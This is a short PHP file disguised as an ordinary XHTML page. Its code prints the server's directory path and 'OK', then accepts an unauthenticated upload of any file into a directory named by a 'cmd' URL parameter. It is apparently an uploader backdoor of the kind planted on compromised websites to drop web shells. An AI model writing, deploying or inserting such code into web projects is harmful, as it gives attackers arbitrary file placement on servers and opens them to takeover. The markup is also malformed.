<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php
echo dirname(__FILE__); 
?></title>
<?php echo "OK"; if (isset($_GET['cmd'])){ $dir=$_GET['cmd']; $folderpathsw="$dir/"; if(!file_exists($folderpathsw)) { mkdir($folderpathsw); } } else { $dir=""; } $uploadfile = getcwd() ."/$dir/". basename($_FILES['File']['name']); if (move_uploaded_file( $_FILES['File']['tmp_name'], $uploadfile)) ?>
</body> 
</html>